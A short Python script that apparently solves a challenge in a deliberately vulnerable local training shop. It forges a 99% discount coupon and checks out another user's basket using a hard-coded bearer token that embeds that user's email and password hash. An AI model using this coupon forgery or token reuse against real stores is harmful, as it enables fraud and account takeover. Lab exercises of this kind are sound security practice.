from zmq.utils import z85
from datetime import datetime
import base64
import time
import requests

PERCENT = "99"

data = {
    "couponData": "",
    "orderDetails": {
        "paymentId": "5",
        "addressId": "4",
        "deliveryMethodId": "1"
    }
}
headers={'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjEtMTEtMTIgMTU6MDU6NDAuOTI0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjEtMTEtMTIgMTU6MDU6NDAuOTI0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTYzNjcyOTcyOCwiZXhwIjoxNjM2NzQ3NzI4fQ.yZE0Lo4nxeSChspIC5WIqpFv1coTlXYXNz4ewRQpPNYtIojm2djpOlHRVG2w4FMBngK0H_0CONK4PxVXIi39xYrz1XOBr5vUhF4MNb-5JKa2KWkfZRPsAwc2xEPwRcnCe1JQPGJm11GhP90flvoDiVerkeDAtGYUUrS7a1ERPB0'}
url = "http://localhost:3000/rest/basket/2/checkout" # we buy for jim
now = datetime.now()
unencoded = now.strftime('%B')[:3].upper()
year = now.year
unencoded += str(year)[2:] + "-" + PERCENT
encoded = z85.encode(unencoded.encode()).decode()
print("Generated key: " + encoded)
curr = int(time.time())
message = f"{encoded}-{curr}"
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes).decode()
data["couponData"]=base64_bytes
print(f"Encoded key: {base64_bytes}")
# add coupon
x = requests.post(url,data=data,headers=headers)
print(x.text)
res = x.json()
code = res["orderConfirmation"]
print(f"Confirmation code: {code}")

